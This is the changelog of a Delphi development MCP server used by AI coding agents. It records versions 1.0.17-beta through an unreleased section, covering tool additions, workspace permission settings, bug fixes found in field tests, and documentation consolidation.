# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/) and the project adheres to
[Semantic Versioning](https://semver.org/): MAJOR.MINOR.PATCH, where MINOR
adds tools/capabilities and PATCH fixes. The server reports its version in
the MCP `initialize` response (`serverInfo.version`).

## [Unreleased]

### Added

- **Screenshots in one step.** `delphi_desktop` and `delphi_adb` return the
  capture IN the same answer, as an MCP `image` content item next to the usual
  text, scaled in memory to `maxwidth` (1280 by default: a 3440-wide desktop
  travels as ~70 KB instead of 365 KB), and consume its temp file on the spot:
  nothing to download, nothing left on disk. `inline=false` gives file +
  `download` as before. One helper (`Lsp.InlineImages.DeliverCapture`) for
  every tool that captures, and one point that wraps text + image
  (`ResultWrapper`, next to the output filter in the tools manager): the next
  tool that returns an image calls `AttachImage` and is done. (David,
  2026-09-25: "1 solo paso es lo logico".)
- **`frame`: the agent never does coordinate arithmetic.** Every capture
  carries a stateless token with its geometry
  (`<imgW>x<imgH>@<srcW>x<srcH>+<x>+<y>`); `tap` / `type` with `frame=` take
  x,y measured on that image and the server converts. It absorbs the three
  sums agents did by hand: dividing by the inline scale, adding a crop's
  origin, and multiplying by Android's `tapScale`. A malformed frame or a
  point outside its image is refused before anything is pressed. Without
  `frame`, x,y mean what they always meant.

### Changed

- A desktop capture that lands in the server's temp folder (the default of
  `delphi_desktop`) is **consumed on retrieval**: `delphi_fetch` deletes it when
  it serves the last chunk (`consumedOnServer`), and one GET on its `download`
  link serves it whole from memory and deletes it; the next request is an
  honest 404. Nothing cached, nothing rotated, nothing kept: need it again,
  take another. A capture requested with `out=` is yours and stays. Measured
  the same day: 10 gestures had left 41 MB in a workspace root, purged only
  at restart. (David, 2026-09-25.) The recognizer now knows both capture
  sub-folders (`desktop` and `android`) from constants shared with the
  namer: Android captures were accumulating too. A capture requested with
  `out=` inside a `__delphi-temp` is refused (the refusal says: omit `out`,
  the image comes in the answer) - 90 captures, 66 MB, had piled up in a
  nested temp folder the startup purge never reaches - and the temporary
  download folder of a desktop capture is always removed.
- `delphi_move` refuses a DESTINATION inside a dead folder (`__delphi-temp`,
  `__history`/`__recovery`, the trash, a `.by` marker); moving OUT of them -
  restoring, keeping a capture - is the source and stays free.
- One destination gate for writers, `WriteTargetDenied` (jail + dead
  folders): `delphi_edit`, `delphi_textedit`, `delphi_create`,
  `delphi_upload`, the capture namer and `delphi_move` call it instead of
  pairing the two checks by hand (four copies). Same behaviour for every
  valid call; only the reason given first can differ when a call fails for
  two things at once. The `out=` of `delphi_adb logcat` stays out on purpose:
  a disposable dump belongs in a temp folder.
- One resolver of the active workspace inside the guard: `HasActiveWS` /
  `ActiveWS` replace 18 hand-written copies of "if a workspace is active, its
  field; else the global", and `LoadSecurity` reads every local-mode key
  (`Roots`, `ReadOnlyPaths`, `ReadOnlyRoots`, `VaultReadOnly`) with the rest
  instead of four lazy readers. No behaviour change, full regression green.
- `Lsp.Base64` is the one base64 encoder/decoder: `delphi_fetch` encoded by
  itself and `delphi_upload` validated and decoded by itself; the decoder
  refuses the wrong alphabet or a length not in groups of four, naming the
  parameter, before touching anything.

## [1.3.0] - 2026-09-25

### Added

- `[Workspace.<name>] ReadOnlyRoots=`: **reference projects**, folders outside
  `Roots` that the workspace reads as its own (read, search, symbols,
  definition, git query, fetch) and never writes: edit, create, move, delete,
  build and test are refused with a message that says why. Separate from
  `Roots` on purpose, so the write jail never sees them, and it wins over
  `Roots`: a folder in both, or a root inside a reference, is read-only. The
  same junction check as the roots; temp files never land there.
  `delphi_workspace` lists them as `readOnlyRoots`, `delphi_projects`
  includes their projects flagged `readOnly:true` (overlaps walked once) and
  checks an explicit `root` with the read gate; `delphi_git` runs its query
  half (status, diff, log, show, bare branch/tag) on a reference repository
  and `delphi_config view` reads a reference project - one git
  classification, shared with the read-only credential. Env
  `DELPHI_MCP_READONLY_ROOTS` for the local launch mode; the contract is
  written at the top of `Lsp.Guard` and measured by a two-server battery.
  (David, 2026-09-25: "que un agente trabaje con sus roots pero pueda ver
  otros proyectos, solo para aprender como se hacen las cosas".)

### Changed

- `QUICKSTART.md` lives at the repository root (was `docs/`), so it is the
  second thing a reader sees, and it ships at the root of the zip too.

## [1.2.4] - 2026-09-25

### Changed

- `delphi_desktop` answers carry the same `download` link as `delphi_fetch`
  for every screenshot, built by one function (`Lsp.Files.DownloadLinkFor`)
  the two tools share. A small agent that retyped the announced path put
  its own folder in the middle and fetched a file that never existed
  (hermes, 2026-09-25); a link is copied, not composed.
- The desktop node says what ESCRITO means: the keys were sent, focus is not
  verified, read the screenshot. The `type` description says the same.

## [1.2.3] - 2026-09-25

### Changed

- `check-binding` is now engine (`Lsp.DesignerBinding`) and runs where an agent
  needs it, not only on request: `delphi_designer lint` includes it when the
  `.pas` is next to the form, every WRITE to a designer through `delphi_edit`
  reports it at once, and `delphi_edit insert=metodo` without `visibility`
  declares the method in `published` when the paired designer already wires
  it as an event (`OnClick = Name`), saying so. Found by hermes on 2026-09-25:
  a handler left in `public`, green build, "Invalid property value" when the
  form loaded on the target - the exact case check-binding had caught since
  round 12, for whoever asked.

## [1.2.2] - 2026-09-25

### Added

- `delphi_move copy=true`: copy instead of move, through the same gate (jail,
  designer pair, `unit X;` header on a different name, no overwrite). The
  source stays, no trash copy is taken, no project is re-pointed (the copy
  is a new unit nobody lists yet: `delphi_config add-unit`). Refused for a
  folder that holds a `.dproj`/`.dpk` (a project never lives in two places)
  and from the trash. A copied folder is born without the source's trash.

### Changed

- Two folders flattened: the vendored MCP plumbing is `vendor/` (was
  `vendor/gdk-mcp-server/`; `VENDOR.md` there still names the upstream and
  its commit) and the agent manual is `skills/SKILL.md` (was
  `skills/cmcpdelphiide/SKILL.md`; its frontmatter name is now `delphi-mcp`,
  and whoever installs it names the folder they copy it into). The `.dpr`
  moved by `delphi_edit`; the two `.dproj` by hand, the known wall.

## [1.2.1] - 2026-09-25

### Added

- `delphi_upload chunkSha256`: the SHA-256 of ONE chunk, verified before the
  chunk is written, so a slip in transit is caught at the chunk that carried
  it with nothing on disk, instead of by the whole-file `sha256` at the end
  with the file already in quarantine. The answer carries `chunkVerified`.
- `docs/QUICKSTART.md`: the five-step path from zero to the first call (one
  Windows machine with Delphi, download, a five-line `settings.ini`, `-gui`,
  connect, `delphi_workspace`), with the five things that go wrong first. It
  ships in the zip and the README points to it at the top of its Quickstart.

### Fixed

- A structured parameter declared as a string (`delphi_edit edits`) sent as a
  REAL JSON array or object arrived empty: the vendor serializer took the
  RTL's `Value`, which is `''` for both, and the batch was silently ignored
  (the tool then fell into single-edit mode with an error about something
  else). It now takes the JSON text. A batch encoded twice (a JSON string
  inside a string) is unwrapped once, and anything still not an array is
  refused naming how many characters arrived and how they start. Reported
  by hermes, 2026-09-25.
- `delphi_upload` checked the base64 alphabet but not its length: a chunk
  with a character lost or gained in transit decoded to extra bytes and was
  only caught by the final sha. A chunk whose useful length is not a
  multiple of 4 is now refused before anything is written.

## [1.2.0] - 2026-09-24

### Added

- `delphi_create kind=project-test`: a DUnitX console runner plus its first
  fixture, green at birth, registered in the `.dproj`, with the answer saying
  how to add fixtures and how to run it. `delphi_test` discovers it (uses
  DUnitX) and runs it. A field agent had to receive that skeleton by note
  (test 27, 2026-09-22); now the tool writes it. Scaffold battery covers it.
- `src/LspUnitTests`: a DUnitX suite of the engine's own units, the step
  below the black-box Python batteries: the encoding detector and its
  inverses (UTF-8 with and without BOM, CP1252, UTF-16 LE/BE, the NUL rule),
  the designer binary shape and the RTL round trip, and the build-hazard scan
  with events ignored. Born through `delphi_create kind=project-test`, run
  through `delphi_test` by `tests/test_engine_dunitx.py`, so it is part of the
  regression.

### Changed

- Repository layout: one project per folder under `src/` - `Server/` (the server
  and the engine units), `StyleConvert/`, `UnitTests/`, `DesktopNode/` (was
  `src_desktop_node/`), `RunJob/` (was `src_run_job/`) and `DesignerMetaDump/`
  (was `tools/designer-meta-dump/`). `LspCoreTest`, the August console harness of
  the LSP core, is gone: nothing used it and `LspUnitTests` is the engine's test
  project now. The move was done through the server's own tools as a field test
  of `delphi_move` on whole folders; what it did not re-point (the relative
  `in '..\vendor\...'` paths and `{$I}` of a moved project, and the `.groupproj`
  no tool edits) is recorded in the log as findings.
- The four `node/` binaries are no longer versioned: two of them never were
  (`*.exe` is ignored) and the other two grew the history by 3 MB per rebuild.
  `BuildGroup.bat Release` produces them and `release_check` now refuses to
  package one that is missing or older than its sources.

### Fixed

- One encoding detector, not two. `delphi_search`, `delphi_references` and
  the linter decoded a file through their own BOM branches while `delphi_read`,
  `delphi_edit`, `delphi_textedit` and the write audit used `Lsp.Patch.DetectEnc`,
  which knew nothing of UTF-16 - so a text `.dfm` the IDE saved in UTF-16 (its
  editor encoding menu) was found by search and refused by read as "binary"
  (NUL bytes). UTF-16 LE/BE by BOM now lives in the one detector, is read,
  edited and written back with its BOM, the header says `encoding=utf16-le`,
  and the "is this text at all" rule (a NUL in the first 64 KB) is one function
  shared by `delphi_read` and `delphi_textedit` instead of two copies with
  different windows.

## [1.1.2] - 2026-09-24

### Added

- `delphi_desktop`: every answer with a capture now carries `windows` - title
  and rectangle of each window in pixels of that capture - on both targets.
  On Linux the list is read from X11/Xwayland (every FMX application, Galatea
  included; native Wayland windows are not listed and `windowsNote` says so),
  so `window=<title>` crops on Linux too. `command=windows` on Linux answers
  with an `overviewNote` explaining the activities overview it opened (a field
  agent took it for the plain desktop, 2026-09-24). The list is optional by
  construction: if the enumeration fails, the capture still comes back and the
  node output says why. The Windows node now writes its output as UTF-8 like
  the Linux one (a title with an accent used to rely on the server's CP1252
  fallback).
- Binary `.dfm` (VCL forms saved in binary, the legacy shape): every reader
  now reads them on the fly as text through the RTL's own conversion (what the
  IDE runs on "View as Text") - `delphi_read`, `delphi_search`, `delphi_designer`
  tree/get/lint/check-binding/layout and the form-name reader of
  `delphi_config` - and says so (`binaryOnDiskNote`). `delphi_designer to-text`
  converts the file on disk with a backup, so it can then be edited like any
  `.dfm`, checked with `lint` and `check-binding` (what the IDE reports when it
  reopens the form) and taken back with `to-binary`, which reproduces the
  IDE's bytes exactly (measured on a 94 KB legacy form: binary -> text ->
  binary identical; the text differs from `convert.exe` only in one padding
  digit of floats). Editing a binary directly stays refused, pointing at
  `to-text`; `.fmx` is always text. One shape detector (`Lsp.DesignerBin`)
  replaces four hand-made byte checks. A legacy form had left a field agent
  blind (Hermes, 2026-09-24). Accents: `to-text` writes them as `#NNN` like
  the IDE; `to-binary` reads a raw one through ANSI, what the RTL parser and
  the IDE expect (fed UTF-8 it produced `#195#179`, measured), and refuses a
  character ANSI cannot hold, asking for `#NNNN`. New battery
  `tests/test_designer_binary.py` (36 checks).
- `delphi_build` no longer refuses a project because of its pre/post build
  EVENTS (signing, copies, EurekaLog): the build runs with them emptied on the
  msbuild line and says so (`buildEventsSkipped`, `buildEventsNote`), so an
  agent can build, test and run a project like Galatea in its workspace; the
  final, signed build stays the operator's, outside this server, where those
  events run. A custom `<Target>`/`<Exec>` or a foreign
  `<Import>` is still refused without `AllowBuildScripts=1`: the same scanner,
  asked once without counting events. Decided by David on 2026-09-24 ("one
  thing is building the final version, another is being able to work and run
  meanwhile").
- `delphi_build` of a package: when a W1033 unit is not in any BPL of the
  install but lives in a `.dpk` of the workspace (found by climbing the folders
  from the one being built, the same search `delphi_move` uses), that package
  joins `requiresSuggested` and `requiresWorkspaceNote` says to build it first.
  A hint only: compiling and installing packages stays the agent's and the
  operator's job (Hermes' point 8, 2026-09-23).

### Fixed

- `delphi_edit` / `delphi_textedit` batches: two entries that resolve to the
  SAME line (`occurrence` 1 twice, expecting the second to mean "the next one")
  are refused at the gate with the rule spelled out - `occurrence` counts on
  the file as it is BEFORE the batch, so after changing occurrence 1 the next
  entry asks for 2 - instead of dying mid-batch with a bare "anchor not at
  line N". Found twice on 2026-09-24 using the server as an agent; the
  contract of `edits` states the rule now.
- `delphi_git merge` on diverged branches answered with git's bare `exit=128`;
  it now says the merge was refused because only fast-forward is allowed and
  nothing was touched. `delphi_workspace` in a tokenless local (stdio) process
  no longer calls the missing jail "unrestricted" next to `access: read-only`.
  `delphi_desktop` refuses an empty `profile` by name (and marks it required in
  the schema, like `delphi_upload.chunkbase64`); `vault_search.target` is
  documented as optional (default `files`), which is what the code does. The
  three descriptions of `fragment` (contract, TOOLS.md, agent skill) now list
  the same exclusions, the engine's.

### Changed

- `delphi_desktop command=windows` is now `command=overview`: the word read as
  the operating system (David, reading a field report: "how did it control
  Windows?") and since today it also names the list that comes with every
  capture. `windows` is still accepted as a silent alias.
- `delphi_workspace` warns with `settingsChangedNote` when `settings.ini` on disk
  is newer than the running process: the file is read once at start-up and is
  not reloaded live (decided by David on 2026-09-24 against a hot reload: a
  running agent's jail must not change under it), so the note says to restart
  the service. README says the same.
- `delphi_edit restore`: the preview now says when the day copy was made and
  how old it is, and warns that the copy is the first of that day for the file
  and does not know who edited it since - restoring takes another agent's work
  with it; precise undo is `delphi_git`. Decided by David on 2026-09-24 over a
  copy per agent: the copy is the day's safety net, not a per-agent undo.
- The house rules (`delphi_help command=conventions`, rule 12), the agent
  skill and AGENT.md now say how to identify: `clientInfo.name` set to the
  agent id, or `agent=<id>` on every `delphi_report` / `delphi_messages`
  call when the client cannot set it (a client introducing itself as `mcp`
  left six notes unread on 2026-09-22). Rule 9 no longer names `AllowRun`.

## [1.1.1] - 2026-09-23

Fixes found by Hermes' 1.2 field battery (2026-09-23), verified against the
code before being accepted.

### Fixed

- `delphi_config add-unit` took a unit for registered when its NAME was in
  the `.dpr` uses clause even without an `in '<path>'` clause: it refreshed
  the `.dproj` DCCReference, left the `.dpr` as it was and answered "nothing
  to change", and the build then failed with F2613 because dcc never got the
  unit's folder. The entry is now completed the way the IDE writes it
  (`USub in 'src\USub.pas'`, directives kept) and the answer says so
  (`COMPLETADA`); a unit already carrying its clause is still "ya estaba".
- `add-unit` on a unit whose header name carries letters outside A-Z/0-9/_
  (`unit UArtículos;`) answered "no tiene cabecera unit X" - false: the header
  is there. Measured: RAD Studio 13 compiles and links such a unit. The
  refusal now states the real cause (this server's parsers do not handle
  accented unit names yet) and points to `delphi_move` or `delphi_report`.
- `delphi_paserver remote-run` against a **Windows** PAServer: the job file
  and the launcher travelled in ONE paclient `--put`, and PAServer started
  the launcher (flag 5) before the job file (flag 0) was written - the
  launcher found no job and exited, the `.job` stayed on the target and the
  agent got `stillRunning` for a program that never started (measured
  2026-09-23 against 192.168.1.10 by hand: 6/6 failures in one put, 6/6 fine
  in two). The job file now goes in its own `--put` before the launcher, on
  every platform.
- `delphi_build target=Deploy` with `verbosity=quiet` (the default) never
  carried `deployedFiles`, and the deploy note said "if it is missing,
  nothing was sent": msbuild only prints the copies at verbose. The note now
  says the count needs `verbosity=verbose`, and quiet or normal add a
  `deployedFilesNote` saying so. And the count itself never matched a
  PAServer deploy: msbuild prints the `paclient --put=...` order, not the
  "Deploying"/"Copying to remote" lines the counter looked for; it now counts
  the files of every `--put` (verbosity=verbose).
- `remote-run` on a Windows target lost the exit code of a short program:
  the watcher opened the process by PID after it had already ended, so the
  answer said `exitCode -1` / `success false` for a program that printed
  its output and returned 0. The launcher now hands the watcher the process
  HANDLE (inherited), which outlives the process, and the real exit code
  comes back.
- `kill` after a failed redeploy: the deploy wipes the target folder before
  failing on the live watcher, taking the job's `.pid` with it, and `kill`
  then answered "no job alive" while the program stayed open (measured:
  two orphaned GUIs). The Windows watcher is now named
  `<job>.wait.<pid>.exe` (one namer, `NombreVigia`, and its inverse
  `PidDelVigia`): a running exe cannot be deleted, so the pid survives where
  the `.pid` does not, and `kill` finds it. Before terminating, `kill` now
  also checks that the pid still runs a binary of that project folder - a
  reused pid is never touched. Needs the launcher shipped in `node\`
  (rebuilt for Win64 and Linux64).
- `delphi_config remove-unit` and `delphi_move` on a unit of a package said
  "uses" for the clause they had touched; they now name it (`contains`),
  as add-unit already did (Hermes, battery 1.2 A.5).
- The `delphi_build` contract now says what a package build adds
  (`implicitImports`, `requiresSuggested`, from W1033) and that a unit dcc
  cannot find at all is F2613 in `missingUnits`, not there; and a package's
  `missingUnitsNote` names the other cure: the package in `requires` plus
  the folder of its `.dcp` on the search path (Hermes, battery 1.2 A.2:
  the search path alone leaves the F2613).
- `delphi_move` of a unit INTO the folder of the project that lists it
  (a package unit going back to its package folder) answered "no .dpr
  listed it" and left the `contains` pointing at the old path: the
  project finder climbed from the SOURCE folder only, and the `.dpk`
  lived below, in the destination. It now climbs from both (Hermes,
  battery 1.2, 2026-09-23); the build was green only because dcc finds
  the unit by name through the search path.
- A `delphi_move` that keeps the unit name (a folder change) reported
  "Referencias reescritas: 1" for replacing the name with itself; it now
  says 0 and touches nothing (measured live, 2026-09-23).
- Rewriting a `uses`/`contains` clause gave a multi-line entry (a unit
  wrapped in a directive, or the neighbour of one just removed) its own
  indentation on top of the clause's: the line came out with two. Each
  line is now re-indented from scratch (measured live with `removeuses`;
  the same code serves add-unit and remove-unit).
- `delphi_adb` over wifi never kept a device: the adb server daemon was
  started from inside the call's job object and died with the call, so
  `connect` said "connected" and the next `devices` saw nothing (measured
  2026-09-23 with a real phone, Hermes' G.23). The daemon is now started
  outside the job (`RunDetached`, the one launcher for processes that
  must outlive a call) before every adb command; `start-server` is
  idempotent.
- `delphi_build` with `verbosity=normal` crashed ("Index out of bounds (1)")
  on an Android build: the linker-line summary asked a regex match for its
  group inside an `IfThen`, which evaluates both branches, and Android's
  linker has no `--sysroot`. Same shape in `delphi_config view` for a
  DeployFile without `<RemoteDir>`. Both now test the match first
  (measured 2026-09-23, Hermes' G.23).

### Removed

- `delphi_run` and its `AllowRun` switch (David, 2026-09-23: "fuera"). It
  was born on the product's first day (v0.10), was closed by default the
  same day (v0.21) and never had a job of its own once `remote-run` existed
  (v0.47): tests run through `delphi_test` (`AllowTests`), build steps
  through `AllowBuildScripts`, programs on a target through
  `delphi_paserver remote-run`. Two execution paths were two doors to
  guard; now there is one. A left-over `AllowRun=1` in the ini is
  ignored, and `AllowRun` no longer implies `AllowTests` or
  `AllowBuildScripts` (each is its own declaration). The low-integrity
  sandbox stays: `delphi_test` runs in it, and the batteries that
  measured it through `delphi_run` now measure it there. 41 tools.

### Added

- `delphi_workspace` answers `workspace`: the name of the
  `[Workspace.<name>]` section the session authenticated with. Nothing
  said it, so the operator could not tell which section of the ini was
  which agent's (Hermes, 2026-09-23).
- Duplicates in `settings.ini` close the workspaces involved instead of
  being swallowed: the same token in two `[Workspace.*]` sections (or a
  `Token=` equal to its `ReadOnlyToken=`), a key repeated inside a
  section, or a section written twice. `TIniFile` reads the first and
  says nothing, so a future copy-paste would have put an agent in the
  wrong jail without a trace (David, 2026-09-23). Now those workspaces
  answer 401 and the startup log names the pair, the key or the
  section.
- `delphi_edit adduses="UnitA;UnitB" section=interface|implementation`: a
  unit enters the `uses` of another unit and the clause is written by the
  engine (the same `FindUses`/`ReplaceUses` that serve the `.dpr` and the
  `.dpk`): commas, terminator, the clause created under the section
  keyword when there is none, names already there skipped, dotted names
  welcome. The mirror of `delphi_config add-unit` for a unit instead of
  a project (David, 2026-09-23: editing a unit's `uses` by hand is the
  natural move, so the tool that edits sources gets the verb). `removeuses`
  is the inverse: the entry goes, a directive around it stays glued to its
  neighbour (the same code remove-unit uses), and the clause goes whole
  when it empties. A unit already in the other section is reported, not
  written twice (E2004; Hermes measured it on UPkgB).

- `delphi_create kind=project-package`: a runtime package from zero, `.dpk`
  (`requires rtl`, no `contains` yet) plus a package `.dproj` measured against
  an IDE-made one (MainSource `.dpk`, AppType/ProjectType Package,
  GenDll/GenPackage, `bpl` extension) with the BPL and the DCP kept in the
  project folder instead of Embarcadero's public Bpl/Dcp folders. Pulled
  forward from 1.2 because Hermes' field battery could not start a package by
  tools at all. A package is worked on, never installed: nothing is
  registered in the IDE.
- The project-units engine understands packages: `delphi_config add-unit`,
  `remove-unit`, `view section=units`, `delphi_create kind=unit` and
  `delphi_move` accept a `.dpk` (or a `.dproj` whose main source is one) and
  edit its `contains` clause the way they edit a `.dpr` uses clause, skipping
  the `requires` clause that precedes it. The first unit opens the `contains`
  clause of a fresh package (an empty one is not legal Pascal). `delphi_delete`
  also looks for the unit in every `.dpk` of the tree.
- Building a package that compiles units of OTHER packages into itself
  (W1033 "implicitly imported": the whole VCL inside a 4.6 MB BPL, measured)
  used to pass in green, and in `quiet` without a word. `delphi_build` now
  asks msbuild for warnings on a package even in quiet, and answers with
  `implicitImports` (the units), `requiresSuggested` (their packages, read
  from the PACKAGEINFO of the BPLs the install ships, never from a table) and
  a `requiresNote` with the exact call - the list the IDE shows when it
  offers to add them to `requires`. `delphi_config command=add-requires
  requires="vcl;dbrtl"` writes them into the `.dpk` (idempotent, creates the
  clause if missing). `warnings[]` stays out of a quiet answer.
- `line1` next to the 0-based `line` in `delphi_references` (candidates, the
  definition, rejected homonyms as `resolvedLine1`) and in every entry of
  `delphi_diagnostics`: the 1-based line `delphi_read` shows, the way
  definition, hover and signature already answer. Additive; `line` keeps
  its meaning. Until now the five engine tools said "line" three different
  ways (measured by the field battery).
- `delphi_completion` no longer lists the token being typed as a candidate:
  the engine returns it with type `<error>` (`{label:'C', detail:': <error>;'}`)
  and it is noise, not a symbol.
- The remote-run battery now exercises `kill`: by `.pid`, repeated (no job),
  and with the `.pid` removed by hand the way a failed redeploy does, where
  the pid comes from the watcher's name. It runs the real Windows launcher,
  spawned outside the server's job object through WMI so the program
  survives the paclient call the way it does on a real target (until now
  every launched process died with the call, which is why `kill` could not
  be measured there). Measured on the way: `kill` compared the program's
  image path with the folder in 8.3 form and refused its own job as "another
  program" - both are canonicalised now; and a stale watcher file whose pid
  no longer exists answers "no job alive" instead of "could not kill".
- docs/DELPHILSP-NOTES: the engine does not check the section legality of
  `{$I}` includes (E2050/E2004 only dcc sees).

- `delphi_build target=Deploy` explains an `E0017 Unable to delete
  <job>.wait.exe`: that is the watcher of a remote-run job whose program is
  still running on the target, so the folder cannot be rewritten. The new
  `deployLockedNote` names the job and the exact `kill` call, and warns that
  the failed deploy may already have removed the job's `.pid` (then the
  program has to be closed on the target by hand).

## [1.1.0] - 2026-09-22

**The first stable release.** Nothing in it is new for the sake of a number:
it is the 1.0.17 line plus the fixes below, a consolidation pass in which the
live tool contract, the README, the tool reference, the skill, the ini
template, the manifest and the release itself were measured against each
other until they told one story, and a full day of real-world field testing by
an independent agent (Hermes) that ran a 51-test battery as a client: 45 tests
executed across every family, four real bugs found and fixed the same day (the
engine's warm-up mistaken for "does not resolve", the declaration fallback, the
unit rename that stopped at the project files, the empty DUnitX failures), the
rest measured as correct. The `-beta` suffix and the BETA notices are gone;
from here on a MINOR adds tools or capabilities, a PATCH fixes, and a
documented contract that changes says so here first. It is 1.1.0 rather than
1.0.0 because seventeen `1.0.x-beta` tags already exist and a `1.0.0` would
sort below all of them.

### Fixed - `delphi_desktop type` on Linux writes accented letters through dead keys
On a Spanish layout the node knew the keys that give a character directly
and refused everything else - so `í`, `á`, `ñ`'s neighbours and every
accented vowel were refused, and a field agent had to type "Articulos"
without its accent (report of 2026-09-22). The keymap the desktop hands
over does carry the dead keys (dead_acute, dead_grave, dead_diaeresis...);
the node now records them by keysym and, for a character it has no direct
key for, types the dead key and then the base letter - exactly what a person
does. Which letter decomposes into which base and diacritic comes from
Unicode's canonical decomposition (161 rows of Latin-1 and Latin Extended-A,
generated, not typed), and a character the layout cannot produce at all is
still refused by name, now saying how many dead keys the map had.

### Added - `delphi_desktop key` takes `modifiers` on both targets
`key` pressed one key and nothing else, so Ctrl+K, Ctrl+C, Alt+Tab were
impossible on a Linux target (the field agent met a field that only opens
with Ctrl+K). `modifiers=ctrl,shift,alt,super` are held while `code` is
pressed - in that order, released in reverse, one gesture - on Linux as
evdev codes, on Windows by name, through the same combination both nodes
already had inside.

### Fixed - `delphi_test run` on a DUnitX project lists the failing tests
Measured the day DUnitX was installed on this machine (2026-09-22, the
installer's "DUnit Unit Testing Frameworks" option, which brings DUnitX too):
a suite with one failing test answered `failed=1` and an EMPTY `failures`,
while `outputTail` carried DUnitX's "Failing Tests" block with the test name
and its message. The block is parsed now (and "Errored Tests" with it): one
entry per test, `Name - Message`. The hand-written PASS/FAIL runner was
already listed correctly.

### Fixed - `delphi_paserver remove-profile` also removes the empty folder paclient left in the IDE's SDKs directory
`paclient` creates an empty `SDKs\<profile>` folder when a profile is
registered and nobody collected it on removal: measured on the operator's
machine on 2026-09-22, ten orphan folders of long-gone test profiles. The
folder now goes with the profile - only when it is empty; a folder with
anything inside stays, as always.

### Fixed - renaming a unit with `delphi_move` follows it into the other units and the qualified references
Hermes' block 4, test 19: `UBatHelper.pas` renamed to `UBatHelperMoved.pas`
rewrote the header, the `.dpr` uses and the `DCCReference`, and the build
died with `E2003 Undeclared identifier: 'UBatHelper'` because the `.dpr`
still said `UBatHelper.Bat11Sum(2, 3)`. The rename stopped at the project
files: neither the `uses` of the other units of the project nor a single
qualified `UnitOld.Identifier` were touched, while the description promised
"uses clauses". Now every unit the project lists, and the `.dpr`, get the
unit name rewritten as a whole identifier (uses entries and qualifiers alike,
outside string literals; comments too, a comment naming the old unit lies),
and the answer counts what it rewrote and where. Battery case added: a unit
that uses the renamed one and names it qualified, plus the same text inside
a string that must stay.

### Fixed - definition and references no longer call the engine's warm-up "does not resolve"
Field finding (Hermes, 2026-09-22, block 5 of the stable battery): five
`delphi_references` / `delphi_definition` calls in a row on the same, correct
position answered `RECHAZADO: el compilador no resuelve ...` while
`delphi_hover` on that very position resolved the symbol, and the next call
passed. DelphiLSP answers null to `definition` while it is still indexing a
unit, and the tools took that null for "not a symbol". There is now ONE
resolver in the LSP client, `DefinitionResolved`, used by `delphi_definition`
and by the anchor of `delphi_references`: when `definition` comes back empty it
asks `hover`; if hover knows the symbol it is warm-up, so it retries with a
pause (four times, 750 ms), and if the engine still has nothing it answers
`error:` "the engine recognises the symbol but has not indexed its definition
yet, call again in a few seconds" - correct-and-repeat, not change-course.
Without hover there is no wait: that position is not a symbol, as before.

### Fixed - `delphi_definition kind=declaration` no longer passes off the enclosing routine as the callee
Same battery, test 20: with `definition` unresolved, the tool fell back to a
direct `declaration` at the call site, and DelphiLSP answers THAT with the
declaration of the routine that CONTAINS the call - which the tool returned as
if it were the callee's. The fallback stays (it is right when the cursor is on
a declaration itself) but the answer now carries a note saying what it is and
that on a call site it is the enclosing routine; and when the cause is the
warm-up above, it answers "not yet" instead of falling back at all.

### Fixed - `delphi_edit insert=metodo` on a class with a nested type
Measured on this server's own `Lsp.Client` while fixing the above: the class
declares a private nested class (`private type TPendingCall = class ... end;`),
the tool took the nested type's `end;` for the class's, wrote the declaration
INSIDE the nested type and refused the requested `visibility=public` as a
section the class "does not have". The class end is now found by depth: a
nested class/record/interface opens on the line that declares it without
closing it and closes on its own `end;`. Battery case added.

### Added - `delphi_list includetrash=true` says how many of the entries are trash copies
Hermes' block 2: with the trash included the `hidden`/`note` pair disappears
(nothing is hidden any more, which is correct) but the reader still wants to
know how many of the listed entries are live files and how many are copies
from `__delphi-patch`. The answer now carries `shownTrash` and a `trashNote`.

### Removed - `delphi_adb_linux`, the deprecated alias of `delphi_desktop`
It was kept "one release" in 1.0.16 so cached schemas kept working, stayed
through 1.0.17, and goes now: one desktop tool, one name, 42 tools. A client
still calling the old name gets the unknown-tool answer; `delphi_desktop`
takes exactly the same parameters.

### Fixed - the live tool descriptions and the documentation tell one story
A consolidation pass measured every tool's live contract (`delphi_help
command=tool`) against TOOLS.md, the README, the skill, the ini template and
the manifest, and fixed both sides where they disagreed. In the server:
`delphi_paserver` now lists `reseat` and `remove-sdk` in its command
description (both existed and were dispatched; an agent reading the contract
could not find them), `delphi_config` lists `set-sdk` and `set-profile`,
`delphi_adb` says that `device` is REQUIRED for every command that touches a
device (the gate has refused an implied device since v0.98; the description
still said "optional when several are attached"), `delphi_build` names the
switch it really checks (`AllowBuildScripts=1`, or `AllowRun=1` which implies
it) and no longer carries a half sentence left by an old edit, and
`delphi_installs` / `delphi_workspace` describe the named Delphi
(`activeDelphiName`, personality, edition, build, `DelphiVersion=`) they have
answered with since 1.0.17. In the docs: TOOLS.md gains the parameters its own
header confessed were missing (`offset`, `includetrash`, `unstage`/`n`,
`platform`, `content`, `purge`, `section`, `unit`, `check-binding`/`layout`,
`kill`), the severity scale (3 = information, 4 = hint), the launcher model
of `remote-run`, and stops saying the opposite of what `get-sdk active`,
`lint` (unknown classes) and `vault_create` (never from MEMORY.md) do. The
README no longer calls TOOLS.md "generated", no longer says
`delphi_rename_symbol` is preview-only or that `LibraryZone` is on by default,
counts five projects and 1650 checks, and its Quickstart says what a local
stdio process without `DELPHI_MCP_TOKEN` gets: read-only. ROADMAP.md is a
status page again (delivered / open / parked / declined) instead of the v0.5
phase list; AGENT.md points at the skill; CAPABILITIES.json no longer states
that an empty `RemoteRunProjects` allows every project.

## [1.0.17-beta] - 2026-09-22

**The roadmap, walked one item at a time with the operator.** Four yes, the
rest closed or parked; every yes measured before it shipped, and one more
thing that was not on the list but turned out to be vital: the agent knows
which Delphi it is working with.

Suite: 74 batteries, 1650 checks, 0 failures.

### Added - `[Workspace.<name>] DelphiVersion`: which RAD Studio a workspace uses
A machine often hosts several Delphi versions side by side, and the server
always took the newest with DelphiLSP. `DelphiVersion=23.0` (the BDS number;
`DELPHI_MCP_DELPHI_VERSION` in launch mode) pins a workspace to one, and one
place applies it: `DiscoverRadStudio`, which every tool already asks for its
installation - build (rsvars/msbuild), the DelphiLSP engine (whose client
key and fabricated settings now carry the version, so two workspaces on two
versions run two engines in one process), profiles, SDKs, components. A
version that is not installed falls back to the default and
`delphi_workspace` / `delphi_installs` say so (`delphiVersionNote`,
`requestedNote`). The workspace decides, not the agent: the version is the
